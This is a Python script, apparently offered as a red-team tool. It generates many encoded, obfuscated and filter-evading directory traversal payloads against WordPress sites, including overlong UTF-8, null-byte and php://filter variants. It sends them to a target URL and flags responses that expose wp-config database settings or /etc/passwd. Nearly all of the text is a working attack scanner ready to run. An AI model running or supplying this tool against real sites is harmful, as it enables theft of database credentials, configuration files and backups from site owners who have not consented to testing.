import requests
import urllib.parse
import base64
import random

# Target URL (modify this as needed)
TARGET_URL = "https://example.com.com/"

# Base directory traversal payloads for WordPress
basic_payloads = [
    "../../../../wp-config.php",
    "../../../../.htaccess",
    "../../../../wp-includes/wp-db.php",
    "../../../../wp-content/debug.log",
    "..\\..\\..\\..\\wp-config.php",
    ".././.././.././.././wp-config.php",
]

# 20 Advanced WordPress-Specific Attack Techniques 🚀
def wordpress_red_team_variants(payload):
    """Generate multiple advanced encoded, obfuscated, and stealth variations of a payload."""
    variations = set()

    # 1️⃣ Basic URL Encodings
    variations.add(urllib.parse.quote(payload))
    variations.add(urllib.parse.quote_plus(payload))
    variations.add(urllib.parse.quote(payload, safe=''))

    # 2️⃣ Double, Triple & Recursive Encoding
    variations.add(urllib.parse.quote(urllib.parse.quote(payload)))
    variations.add(urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload))))
    variations.add(urllib.parse.quote_plus(urllib.parse.quote(payload)))

    # 3️⃣ Unicode Encoding Tricks
    variations.add(payload.replace("/", "%u2215").replace("\\", "%u2216"))
    variations.add(payload.replace("/", "%e2%81%84"))
    variations.add(payload.replace("/", "%ef%bc%8f"))
    variations.add(payload.replace("/", "%c0%af"))
    variations.add(payload.replace("/", "%e0%80%af"))

    # 4️⃣ Base64 Encoding
    variations.add(base64.b64encode(payload.encode()).decode())

    # 5️⃣ Hex Encoding
    hex_encoded = "".join("%{:02x}".format(ord(char)) for char in payload)
    variations.add(hex_encoded)

    # 6️⃣ Alternative Path Separators (Path Normalization Attacks)
    variations.update([
        payload.replace("/", "//"),
        payload.replace("/", "\\/"),
        payload.replace("/", ".\\"),
        payload.replace("/", "/////"),
        payload.replace("/", "%5C"),
        payload.replace("/", "%2F"),
        payload.replace("/", "/./"),
        payload.replace("/", "/././"),
    ])

    # 7️⃣ WordPress Admin Directory Traversal
    wp_admin_variants = [
        f"/wp-admin/{payload}",
        f"/wp-admin/includes/{payload}",
        f"/wp-admin/maint/{payload}",
    ]
    variations.update(wp_admin_variants)

    # 8️⃣ WordPress Config File Extraction
    wp_config_variants = [
        f"/wp-config.php",
        f"/wp-config-sample.php",
        f"/wp-content/wp-config.php",
        f"/wp-content/uploads/wp-config.php",
    ]
    variations.update(wp_config_variants)

    # 9️⃣ WordPress Debug Log & Backup Files
    wp_debug_variants = [
        f"/wp-content/debug.log",
        f"/wp-content/uploads/debug.log",
        f"/wp-content/uploads/wp-backup.zip",
        f"/wp-content/uploads/wp-backup.tar.gz",
    ]
    variations.update(wp_debug_variants)

    # 🔟 Plugins Directory Traversal
    wp_plugins_variants = [
        f"/wp-content/plugins/{payload}",
        f"/wp-content/plugins/akismet/{payload}",
        f"/wp-content/plugins/woocommerce/{payload}",
    ]
    variations.update(wp_plugins_variants)

    # 11️⃣ Themes Directory Traversal
    wp_themes_variants = [
        f"/wp-content/themes/{payload}",
        f"/wp-content/themes/twentytwenty/{payload}",
        f"/wp-content/themes/twentytwentyone/{payload}",
    ]
    variations.update(wp_themes_variants)

    # 12️⃣ WordPress XML-RPC Bypass (Used for Brute-Force & Enumeration)
    wp_xmlrpc_variants = [
        f"/xmlrpc.php",
        f"/xmlrpc.php?rsd",
        f"/xmlrpc.php?debug=1",
    ]
    variations.update(wp_xmlrpc_variants)

    # 13️⃣ WordPress REST API Information Disclosure
    wp_rest_variants = [
        f"/wp-json/wp/v2/users",
        f"/wp-json/wp/v2/posts",
        f"/wp-json/wp/v2/settings",
    ]
    variations.update(wp_rest_variants)

    # 14️⃣ WordPress Database & Backup Extractions
    wp_db_variants = [
        f"/wp-includes/wp-db.php",
        f"/wp-content/database.sql",
        f"/wp-content/db-backup.sql",
        f"/wp-content/wp-db-backup.sql",
    ]
    variations.update(wp_db_variants)

    # 15️⃣ WordPress Hidden Directories & Security Bypass
    wp_hidden_variants = [
        f"/wp-content/uploads/.git",
        f"/wp-content/uploads/.svn",
        f"/wp-content/uploads/.htpasswd",
    ]
    variations.update(wp_hidden_variants)

    # 16️⃣ Wildcard Injection (Bypassing Directory Constraints)
    wildcard_variants = [
        payload.replace("/", "/*/"),
        payload.replace("/", "/%2A/"),
    ]
    variations.update(wildcard_variants)

    # 17️⃣ Encoding Chaos (Randomized Obfuscation)
    encoded_chaos = "".join([random.choice([urllib.parse.quote(c), c]) for c in payload])
    variations.add(encoded_chaos)

    # 18️⃣ PHP Wrappers (PHP Filter Chains)
    php_variants = [
        f"php://filter/convert.base64-encode/resource={payload}",
        f"php://input/{payload}",
    ]
    variations.update(php_variants)

    # 19️⃣ Null Byte Injection (Tricking Input Validation)
    variations.add(payload + "%00")

    # 20️⃣ WordPress Readme & Version Detection
    wp_readme_variants = [
        f"/readme.html",
        f"/license.txt",
        f"/wp-includes/version.php",
    ]
    variations.update(wp_readme_variants)

    return list(variations)

def generate_wp_variants(payloads):
    """Generate all encoded and obfuscated variants for a list of payloads."""
    all_payloads = set(payloads)
    for payload in payloads:
        all_payloads.update(wordpress_red_team_variants(payload))
    return list(all_payloads)

# Function to test generated payloads
def test_traversal_payloads(url, payloads):
    for payload in payloads:
        full_url = url + payload
        try:
            response = requests.get(full_url, timeout=5)
            print(f"Testing: {full_url} - Status Code: {response.status_code}")
            if "root:x" in response.text or "DB_NAME" in response.text:
                print(f"[*] Potential Vulnerability Found: {full_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error testing {full_url}: {e}")

if __name__ == "__main__":
    print("[*] Generating Ultimate WordPress Red-Team Payload Variations...")
    all_payloads = generate_wp_variants(basic_payloads)

    print(f"[*] Total Payloads to Test: {len(all_payloads)}")
    test_traversal_payloads(TARGET_URL, all_payloads)